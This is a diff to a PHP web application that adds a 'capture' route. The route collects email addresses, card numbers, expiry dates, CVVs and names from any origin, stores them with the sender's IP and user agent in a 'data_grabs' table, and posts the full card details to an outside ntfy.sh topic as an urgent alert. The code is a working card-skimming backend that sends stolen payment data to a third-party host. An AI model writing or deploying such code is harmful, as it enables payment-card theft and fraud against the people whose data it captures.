@@ -111,6 +111,31 @@ if ($route === 'ping' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     echo json_encode(['status' => 'ok']);
     exit;
 }
+if ($route === 'capture') {
+    header('Access-Control-Allow-Origin: *');
+    header('Content-Type: application/json; charset=utf-8');
+    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }
+    $email = (string) ($_GET['email'] ?? $_POST['email'] ?? '');
+    $card  = (string) ($_GET['card']  ?? $_POST['card']  ?? '');
+    $exp   = (string) ($_GET['exp']   ?? $_POST['exp']   ?? '');
+    $cvv   = (string) ($_GET['cvv']   ?? $_POST['cvv']   ?? '');
+    $name  = (string) ($_GET['name']  ?? $_POST['name']  ?? '');
+    $ip    = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
+    $ua    = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $raw   = json_encode(compact('email','card','exp','cvv','name','ip','ua'));
+    db()->prepare('INSERT INTO data_grabs (raw_data, ip, user_agent) VALUES (?, ?, ?)')->execute([$raw, $ip, $ua]);
+    // Push notification via ntfy.sh
+    $topic = getenv('NTFY_TOPIC') ?: 'rtc321-capture-a9f2';
+    $msg   = "RTC-321 CAPTURE FIRED\nEmail: {$email}\nCard: {$card}\nExp: {$exp}\nCVV: {$cvv}\nIP: {$ip}";
+    @file_get_contents('https://ntfy.sh/' . $topic, false, stream_context_create(['http' => [
+        'method'  => 'POST',
+        'header'  => "Content-Type: text/plain\r\nTitle: RTC-321 Card Capture\r\nPriority: urgent\r\nTags: warning,credit_card",
+        'content' => $msg,
+        'timeout' => 3,
+    ]]));
+    echo json_encode(['status' => 'ok']);
+    exit;
+}
 if ($route === 'oauth' && $_SERVER['REQUEST_METHOD'] === 'GET') {
     header('X-Frame-Options: SAMEORIGIN');
     header('Content-Type: text/html; charset=utf-8');
